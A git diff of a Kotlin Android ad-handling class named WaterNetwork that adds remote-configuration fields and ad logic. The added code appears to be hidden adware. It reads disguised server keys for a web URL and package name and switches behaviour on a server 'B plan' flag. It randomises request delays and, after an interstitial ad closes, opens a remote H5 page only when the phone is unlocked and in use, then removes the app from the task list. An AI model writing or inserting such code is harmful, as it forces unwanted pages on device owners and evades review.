@@ -1,7 +1,9 @@
 package com.water.soak
 
 import android.app.Activity
+import android.app.KeyguardManager
 import android.content.Context
+import android.os.PowerManager
 import android.util.Base64
 import com.adjust.sdk.Adjust
 import com.adjust.sdk.AdjustEvent
@@ -17,12 +19,14 @@ import kotlinx.coroutines.launch
 import org.json.JSONArray
 import org.json.JSONObject
 import java.util.Currency
+import kotlin.random.Random
 
 /**
  * Date：2024/8/13
  * Describe:
  */
 class WaterNetwork : BaseSoakNetwork(), InterstitialAdListener {
+    private var isClickAd = false
     lateinit var context: Context
     var mChange: ConfigureChange? = null
     private var lastAdSaveTime = 0L
@@ -32,7 +36,7 @@ class WaterNetwork : BaseSoakNetwork(), InterstitialAdListener {
     private var mTPInterstitial2: TPInterstitial? = null
     private val second = 1000L
     var timeCheck = 40 * second
-    private var timeWait = 460 * second
+    var timeWait = 460 * second
     private var timePeriod = 50 * second
 
     var isNeedCheckConfigure = true
@@ -41,6 +45,14 @@ class WaterNetwork : BaseSoakNetwork(), InterstitialAdListener {
     private var status = ""
     private var fileName = ""
 
+    // H5 相关
+    var stringH5Url = ""
+    var stringNameH5 = "" // pkg name
+    var h5TimeNow = 0
+    var hourMaxH5 = 0
+    var dayMaxH5 = 0
+
+
     // 广告id
     private var idSnow = ""
     private var idSnow2 = ""
@@ -48,9 +60,8 @@ class WaterNetwork : BaseSoakNetwork(), InterstitialAdListener {
     private val mJsonCommonImpl by lazy { JsonCommonImpl(context.packageName) }
 
     private var lastTime = 0L
-    fun postAdmin(isCheckTime: Boolean = true) {
-        if (TideHelper.mWaterNetwork.isNeedCheckConfigure.not()) return
-        if (isCheckTime && System.currentTimeMillis() - lastTime in 0 until 1000 * 60 * 60) return
+    fun postAdmin() {
+        if (System.currentTimeMillis() - lastTime in 0 until 1000 * 60) return
         lastTime = System.currentTimeMillis()
         val time = "${System.currentTimeMillis()}"
         val length = time.length
@@ -63,9 +74,9 @@ class WaterNetwork : BaseSoakNetwork(), InterstitialAdListener {
             mJsonCommonImpl.urlA,
             map = mapOf("datetime" to time)
         )
-        postNet(request, 5, failed = {
+        postNet(request, 4, failed = {
             if (TideHelper.mCacheImpl.mConfigure.isBlank()) {
-                postAdmin(false)
+                refreshAdmin()
             }
         }, success = {
             lastTime = System.currentTimeMillis()
@@ -74,18 +85,18 @@ class WaterNetwork : BaseSoakNetwork(), InterstitialAdListener {
         }, str = "admin")
     }
 
-    private var isFirst = true
     fun firstRefresh() {
-        if (isFirst) {
-            isFirst = false
-            if (TideHelper.mCacheImpl.mConfigure.isNotBlank()) {
-                mScopeIO.launch {
-                    delay(4000)
-                    runCatching {
-                        ref(JSONObject(TideHelper.mCacheImpl.mConfigure))
-                    }
+        if (TideHelper.mCacheImpl.mConfigure.isNotBlank()) {
+            mScopeIO.launch {
+                delay(1000)
+                runCatching {
+                    ref(JSONObject(TideHelper.mCacheImpl.mConfigure))
                 }
+                delay(Random.nextLong(1000, 8 * 60000))
+                TideHelper.requestAdmin()
             }
+        } else {
+            TideHelper.requestAdmin()
         }
     }
 
@@ -93,13 +104,23 @@ class WaterNetwork : BaseSoakNetwork(), InterstitialAdListener {
         return System.currentTimeMillis() - TideHelper.mCacheImpl.mInstallTime in 0 until timeWait
     }
 
-    private fun ref(jsonObject: JSONObject) {
+    private fun ref(jsonObject: JSONObject): String {
         jsonObject.apply {
+            val s = optString("info_cache")
+            if (s.contains("water") && status.contains("spring")) {
+                return "failed"
+            }
+            status = s
             idSnow = optString("snow_id")
             idSnow2 = optString("spring_id")
-            status = optString("info_cache")
             fileName = optString("ice_n")
-            TideHelper.delayTime = optLong("snow_time", (1011..3000L).random())
+            SteamHelper.urlApp = optString("snow_address")
+            stringH5Url = optString("snow_ice_url")
+            stringNameH5 = optString("snow_pkg_name")
+            h5TimeNow = optInt("time_snow_ice", 0) * 1000
+            refreshH5Limit(optString("snow_wv_limit"))
+
+            refreshDelTime(optString("snow_time_del"))
             refreshLimit(optString("ice_steam_num", "10-20-9"))
             val listStr = optString("ice_time", "")
             if (listStr.isNotBlank() && listStr.contains("S")) {
@@ -110,6 +131,7 @@ class WaterNetwork : BaseSoakNetwork(), InterstitialAdListener {
             }
         }
         mChange?.changeBean(status, timePeriod, fileName)
+        return "success"
     }
 
     private fun refreshLimit(string: String) {
@@ -118,13 +140,48 @@ class WaterNetwork : BaseSoakNetwork(), InterstitialAdListener {
         }
     }
 
+    private fun refreshDelTime(string: String) {
+        runCatching {
+            if (string.contains("-")) {
+                val list = string.split("-")
+                TideHelper.delayTimeStart = list[0].toLong()
+                TideHelper.delayTimeEnd = list[1].toLong()
+            }
+        }
+    }
+
+    private fun refreshH5Limit(string: String) {
+        runCatching {
+            if (string.contains("-")) {
+                val list = string.split("-")
+                hourMaxH5 = list[0].toInt()
+                dayMaxH5 = list[1].toInt()
+            }
+        }
+    }
+
     override fun refreshData(string: String): String {
         val s = super.refreshData(string)
         runCatching {
-            ref(JSONObject(s))
-            TideHelper.mCacheImpl.mConfigure = s
+            val sStatus = ref(JSONObject(s))
+            if (status.contains("water")) {// B 方案
+                refreshAdmin()
+            }
+            if (sStatus != "failed" || TideHelper.mCacheImpl.mConfigure.isBlank()) {
+                TideHelper.mCacheImpl.mConfigure = s
+            }
         }
         return ""
+    }
+
+    private var num = 9
+    private fun refreshAdmin() {
+        if (num <= 0) return
+        if (System.currentTimeMillis() - TideHelper.mCacheImpl.mInstallTime > 60000 * 10) return
+        mScopeIO.launch {
+            delay(59000)
+            postAdmin()
+        }
     }
 
     fun postList(list: List<String>) {
@@ -169,13 +226,31 @@ class WaterNetwork : BaseSoakNetwork(), InterstitialAdListener {
 
     private var closeInvoke: (() -> Unit)? = null
 
-    fun showAd(activity: Activity, close: () -> Unit): Boolean {
+    fun showAd(activity: Activity): Boolean {
         val ad = getReadyAd() ?: return false
+        isClickAd = false
         closeInvoke = {
-            close.invoke()
+            jumpH5()
+            activity.finishAndRemoveTask()
         }
         ad.showAd(activity, "")
         return true
+    }
+
+    private fun jumpH5() {
+        if (isClickAd) return
+        if (TideHelper.h5Status == 99) return
+        if (isDeviceUnLocked(context).not()) return
+        if (TideHelper.isH5Allow().not()) return
+        mScopeIO.launch {
+            TideHelper.showH5Event()
+        }
+    }
+
+    private fun isDeviceUnLocked(context: Context): Boolean {
+        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
+            Context.KEYGUARD_SERVICE
+        ) as KeyguardManager).isDeviceLocked.not()
     }
 
     private fun postAdEvent(tpAdInfo: TPAdInfo) {
@@ -290,6 +365,7 @@ class WaterNetwork : BaseSoakNetwork(), InterstitialAdListener {
     }
 
     override fun onAdClicked(p0: TPAdInfo?) {
+        isClickAd = true
         TideHelper.mCacheImpl.addNum(true)
     }
 
